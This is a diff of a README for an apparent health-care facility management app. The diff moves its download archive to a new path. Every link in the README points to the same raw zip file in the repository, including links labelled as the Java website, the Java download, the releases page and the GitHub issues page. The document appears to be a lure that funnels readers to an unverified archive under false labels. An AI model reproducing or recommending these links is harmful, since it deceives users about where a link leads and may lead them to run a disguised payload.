@@ -1,7 +1,7 @@
 # 🏥 Health-Care-Facility - Manage Patient Care Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip)
+[![Download Latest Release](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the Health-Care-Facility management system. This application helps health care facilities manage patient registration, appointments, records, and pharmacy billing. Follow the steps below to download and set up the application.
@@ -12,7 +12,7 @@ Before you install the application, make sure your system meets these requiremen
 - Operating System: Windows 10 or later, macOS Sierra or later
 - RAM: 4 GB minimum
 - Processor: Intel i3 or equivalent
-- Java Runtime Environment: Version 8 or later (you can download it [here](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip))
+- Java Runtime Environment: Version 8 or later (you can download it [here](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip))
   
 ## 📂 Features
 This application offers various tools to streamline health care management, including:
@@ -24,7 +24,7 @@ This application offers various tools to streamline health care management, incl
 - Pharmacy Stock Control: Keep track of medication supply and stock levels.
 
 ## 📥 Download & Install
-To download the Health-Care-Facility application, visit our [Releases page](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip).
+To download the Health-Care-Facility application, visit our [Releases page](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip).
 
 1. Click the link above.
 2. Look for the latest version.
@@ -48,16 +48,16 @@ To download the Health-Care-Facility application, visit our [Releases page](http
 ## 🔧 Troubleshooting
 If you encounter issues, consider the following solutions:
 
-- **Application Won’t Start:** Ensure your Java Runtime is up to date. Visit the [Java website](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip) to update.
+- **Application Won’t Start:** Ensure your Java Runtime is up to date. Visit the [Java website](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip) to update.
 - **Error Messages:** Take note of any error messages displayed and check our FAQs or open an issue on GitHub.
 - **Not Responding:** Try restarting the application. If the issue persists, a system restart may help.
 
 ## 📞 Support
-For additional help, open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip). Please provide details about your problem, including error messages and steps taken.
+For additional help, open an issue on our [GitHub Issues page](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip). Please provide details about your problem, including error messages and steps taken.
 
 ## 📌 Important Links
-- [Visit Releases Page to Download](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip)
-- [Java Download](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/ReWaZeDEV/Health-Care-Facility/master/src/main/java/LabAssistant/Health-Care-Facility_1.3.zip)
+- [Visit Releases Page to Download](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip)
+- [Java Download](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip)
+- [GitHub Issues Page](https://github.com/ReWaZeDEV/Health-Care-Facility/raw/refs/heads/master/database/Care-Facility-Health-v3.7.zip)
 
 Thank you for choosing Health-Care-Facility to manage your health care tasks effectively. We appreciate your feedback and strive for constant improvement!
